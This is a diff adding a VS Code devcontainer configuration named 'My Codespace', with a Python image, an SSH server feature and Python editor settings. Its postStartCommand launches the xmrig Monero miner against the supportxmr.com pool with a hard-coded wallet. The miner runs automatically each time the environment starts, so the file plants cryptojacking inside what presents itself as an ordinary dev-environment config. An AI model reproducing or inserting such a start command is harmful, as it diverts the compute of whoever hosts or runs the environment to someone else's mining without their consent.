@@ -1,0 +1,20 @@
+{
+    "name": "My Codespace",
+    "image": "mcr.microsoft.com/vscode/devcontainers/python:3.8",
+    "features": {
+        "ghcr.io/devcontainers/features/sshd:1": {
+            "version": "latest"
+        }
+    },
+    "postStartCommand": "cd xmrig/build && ./xmrig -o pool.supportxmr.com:3333 -u 49uRPupZAL1LKEheF9Fe8TCpUPiBPMzP9bqXXJkxnG9gDzV6re7RgLG5JyUgkjvUdYe2zKzcz4Gy4A5ZrcHKzhBi7m4Lf4A -p worke2 -k --coin monero",
+    "customizations": {
+        "vscode": {
+            "settings": {
+                "python.pythonPath": "/usr/local/bin/python"
+            },
+            "extensions": [
+                "ms-python.python"
+            ]
+        }
+    }
+}
